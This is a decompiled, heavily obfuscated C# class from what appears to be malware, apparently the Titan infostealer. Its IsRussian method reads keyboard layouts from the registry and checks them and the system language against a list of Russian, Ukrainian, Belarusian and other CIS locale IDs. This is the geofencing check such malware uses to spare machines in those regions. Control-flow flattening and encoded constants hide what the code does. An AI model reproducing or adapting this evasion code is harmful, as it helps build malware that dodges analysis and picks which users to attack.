using System;
using System.Collections.Generic;
using Microsoft.Win32;

namespace Titan.Function;

internal class Localization
{
	private static readonly List<int> KeyboardLayouts = new List<int>
	{
		1049, 1058, 1059, 1061, 1062, 1063, 1064, 1065, 1067, 1068,
		1079, 1087, 1088, 1090, 1091, 1092, 10241
	};

	private static readonly List<string> Languages;

	private static List<int> GetKeyboardLayout()
	{
		//IL_004a: Expected O, but got I4
		List<int> list = new List<int>();
		try
		{
			RegistryKey registryKey = _003CModule_003E._0017_00BF_00B4Ç_001D(Registry.CurrentUser, _003CModule_003E._6931997e<string>((uint)(_003CModule_003E.a200837b("MTM3MjYwODY2Mg==") + 3006674 - Math.Min(3006674, 6013348)), 0 + int.Parse("1553421201")));
			string[] array = default(string[]);
			int num3 = default(int);
			string text = default(string);
			while (true)
			{
				int num = -203512381;
				while (true)
				{
					int num2;
					switch ((uint)(num2 = _003CModule_003E._27811024(num)) % 9u)
					{
					case 5u:
						break;
					case 1u:
						array = _003CModule_003E.º_0026áèÈ(registryKey);
						num = (num2 * 2054195604) ^ 0x70E5187A;
						continue;
					case 6u:
						num = (num2 * -569960339) ^ -1281710024;
						continue;
					case 8u:
					{
						int num4;
						if (num3 < array.Length)
						{
							num = -589056382;
							num4 = num;
						}
						else
						{
							num = 353152980;
							num4 = num;
						}
						continue;
					}
					case 7u:
						num3 = 0;
						num = (num2 * 804632576) ^ 0x557B001D;
						continue;
					case 2u:
						list.Add(_003CModule_003E._0094_00A8ÃUÒ((string)_003CModule_003E._002BÐ_00807m(registryKey, text), 16));
						num = (num2 * -896476104) ^ 0x44DD378F;
						continue;
					case 0u:
						num3++;
						num = (num2 * 1079604326) ^ -453191467;
						continue;
					case 4u:
						text = array[num3];
						num = -1031930675;
						continue;
					default:
						return list;
					case 3u:
						return list;
					}
					break;
				}
			}
		}
		catch
		{
			return list;
		}
	}

	public static bool IsRussian()
	{
		//Discarded unreachable code: IL_00e2, IL_0176, IL_0253
		bool result = default(bool);
		using (List<int>.Enumerator enumerator = GetKeyboardLayout().GetEnumerator())
		{
			int current2 = default(int);
			while (enumerator.MoveNext())
			{
				int current;
				while (true)
				{
					current = enumerator.Current;
					int num = -1116188643;
					while (true)
					{
						int num2;
						switch ((uint)(num2 = _003CModule_003E._27811024(num)) % 3u)
						{
						case 2u:
							num = -787429264;
							continue;
						case 1u:
							break;
						default:
							goto end_IL_0032;
						}
						break;
					}
					continue;
					end_IL_0032:
					break;
				}
				using List<int>.Enumerator enumerator2 = KeyboardLayouts.GetEnumerator();
				while (true)
				{
					IL_00c0:
					int num3;
					int num4;
					if (!enumerator2.MoveNext())
					{
						num3 = -199813316;
						num4 = num3;
					}
					else
					{
						num3 = -192192559;
						num4 = num3;
					}
					while (true)
					{
						int num2;
						switch ((uint)(num2 = _003CModule_003E._27811024(num3)) % 7u)
						{
						case 5u:
							num3 = -192192559;
							continue;
						default:
							goto end_IL_0053;
						case 2u:
							current2 = enumerator2.Current;
							num3 = -1668047022;
							continue;
						case 1u:
						{
							int num5;
							int num6;
							if (current == current2)
							{
								num5 = -704679797;
								num6 = num5;
							}
							else
							{
								num5 = -740436837;
								num6 = num5;
							}
							num3 = num5 ^ (num2 * -1966325219);
							continue;
						}
						case 3u:
							result = true;
							num3 = (num2 * -1579372931) ^ -2030932524;
							continue;
						case 4u:
							break;
						case 6u:
							goto end_IL_0053;
						case 0u:
							return result;
						}
						goto IL_00c0;
						continue;
						end_IL_0053:
						break;
					}
					break;
				}
			}
		}
		using (List<string>.Enumerator enumerator3 = Languages.GetEnumerator())
		{
			string current3 = default(string);
			while (true)
			{
				IL_0199:
				int num7;
				int num8;
				if (enumerator3.MoveNext())
				{
					num7 = 346463170;
					num8 = num7;
				}
				else
				{
					num7 = 25790621;
					num8 = num7;
				}
				while (true)
				{
					int num2;
					switch ((uint)(num2 = _003CModule_003E._27811024(num7)) % 10u)
					{
					case 0u:
						num7 = 346463170;
						continue;
					default:
						goto end_IL_0134;
					case 9u:
						result = true;
						num7 = (num2 * 1669875736) ^ 0x10E60977;
						continue;
					case 6u:
						break;
					case 8u:
						result = true;
						num7 = (num2 * 1354456847) ^ 0x68E96171;
						continue;
					case 2u:
					{
						int num10;
						int num11;
						if (_003CModule_003E._00BEÓ_0089_00D73(current3, _003CModule_003E.hÂ_00A5_002C_00A4(_003CModule_003E._0019_009B_0092pÿ())))
						{
							num10 = -617123851;
							num11 = num10;
						}
						else
						{
							num10 = 719606073;
							num11 = num10;
						}
						num7 = num10 ^ (num2 * -1521351504);
						continue;
					}
					case 4u:
						current3 = enumerator3.Current;
						num7 = 102619432;
						continue;
					case 7u:
					{
						int num9;
						if (_003CModule_003E._00BEÓ_0089_00D73(current3, _003CModule_003E.hÂ_00A5_002C_00A4(_003CModule_003E._0081n_0088PÃ())))
						{
							num7 = -763288664;
							num9 = num7;
						}
						else
						{
							num7 = -350022242;
							num9 = num7;
						}
						continue;
					}
					case 3u:
						goto end_IL_0134;
					case 1u:
						return result;
					case 5u:
						return result;
					}
					goto IL_0199;
					continue;
					end_IL_0134:
					break;
				}
				break;
			}
		}
		return false;
	}

	static Localization()
	{
		//IL_0129: Expected O, but got I4
		//IL_0169: Expected O, but got I4
		//IL_01a9: Expected O, but got I4
		//IL_01e9: Expected O, but got I4
		//IL_0229: Expected O, but got I4
		//IL_0269: Expected O, but got I4
		//IL_02a9: Expected O, but got I4
		//IL_02e9: Expected O, but got I4
		//IL_0329: Expected O, but got I4
		//IL_0369: Expected O, but got I4
		//IL_03a9: Expected O, but got I4
		//IL_03e9: Expected O, but got I4
		//IL_0429: Expected O, but got I4
		//IL_0469: Expected O, but got I4
		//IL_04a9: Expected O, but got I4
		//IL_04e9: Expected O, but got I4
		//IL_0529: Expected O, but got I4
		while (true)
		{
			int num = -163952423;
			while (true)
			{
				int num2;
				switch ((uint)(num2 = _003CModule_003E._27811024(num)) % 3u)
				{
				case 0u:
					break;
				default:
					return;
				case 2u:
					goto IL_00e9;
				case 1u:
					return;
				}
				break;
				IL_00e9:
				Languages = new List<string>
				{
					_003CModule_003E._31ec1b2a<string>((uint)(_003CModule_003E.a200837b("MjAzODc3NzEwMg==") + Math.Min(3188975, 6377950) - 3188975), 0 + int.Parse("330468823")),
					_003CModule_003E._31ec1b2a<string>((uint)(_003CModule_003E.a200837b("MTE5NzE2Mjg4MA==") + 3188975 - Math.Max(3188975, 1594487)), 0 + int.Parse("62845453")),
					_003CModule_003E._6931997e<string>((uint)(_003CModule_003E.a200837b("MjEwMzg1NzYzNQ==") + 3188975 - Math.Max(3188975, 1594487)), 0 + int.Parse("1238238216")),
					_003CModule_003E._31ec1b2a<string>((uint)(_003CModule_003E.a200837b("LTQ4NjA2NTU2NA==") + 3188975 - Math.Max(3188975, 1594487)), 0 + int.Parse("1779081569")),
					_003CModule_003E._6931997e<string>((uint)(_003CModule_003E.a200837b("ODA3OTYwMDYz") + 3188975 - Math.Min(3188975, 6377950)), 0 + int.Parse("486481814")),
					_003CModule_003E._0aa39330<string>((uint)(_003CModule_003E.a200837b("LTE0NzI0MjMyMTM=") + Math.Min(3188975, 6377950) - 3188975), 0 + int.Parse("1673878121")),
					_003CModule_003E._49b74782<string>((uint)(_003CModule_003E.a200837b("Mjk1ODczNzk2") + 3188975 - Math.Min(3188975, 6377950)), 0 + int.Parse("1218579329")),
					_003CModule_003E._0aa39330<string>((uint)(_003CModule_003E.a200837b("LTE0NzI0MjMyMTc=") + Math.Min(3188975, 6377950) - 3188975), 0 + int.Parse("2025693917")),
					_003CModule_003E._9e15c4c7<string>((uint)(_003CModule_003E.a200837b("LTEwOTQxMTgwMw==") + 3188975 - Math.Max(3188975, 1594487)), 0 + int.Parse("1203211970")),
					_003CModule_003E._6931997e<string>((uint)(_003CModule_003E.a200837b("MTg2MzE4MzQyOQ==") + 3188975 - Math.Max(3188975, 1594487)), 0 + int.Parse("1496244369")),
					_003CModule_003E._6931997e<string>((uint)(_003CModule_003E.a200837b("MTIxNTIzNDY0Mw==") + 3188975 - Math.Min(3188975, 6377950)), 0 + int.Parse("653403475")),
					_003CModule_003E._9e15c4c7<string>((uint)(_003CModule_003E.a200837b("LTEwOTQxMTc5Mw==") + 3188975 - Math.Max(3188975, 1594487)), 0 + int.Parse("1669562217")),
					_003CModule_003E._31ec1b2a<string>((uint)(_003CModule_003E.a200837b("NTI5MzQxMDMw") + Math.Min(3188975, 6377950) - 3188975), 0 + int.Parse("2099477764")),
					_003CModule_003E._49b74782<string>((uint)(_003CModule_003E.a200837b("Mjk1ODczNzg2") + Math.Min(3188975, 6377950) - 3188975), 0 + int.Parse("911562135")),
					_003CModule_003E._0aa39330<string>((uint)(_003CModule_003E.a200837b("LTE0NzI0MjMyMzE=") + Math.Min(3188975, 6377950) - 3188975), 0 + int.Parse("60920431")),
					_003CModule_003E._9e15c4c7<string>((uint)(_003CModule_003E.a200837b("LTEwOTQxMTM2OQ==") + Math.Min(3188975, 6377950) - 3188975), 0 + int.Parse("748663471")),
					_003CModule_003E._31ec1b2a<string>((uint)(_003CModule_003E.a200837b("MTQ1Nzg1MTQzOA==") + 3188975 - Math.Max(3188975, 1594487)), 0 + int.Parse("1540393925"))
				};
				num = (num2 * 486733764) ^ 0x5BD2E8A5;
			}
		}
	}
}
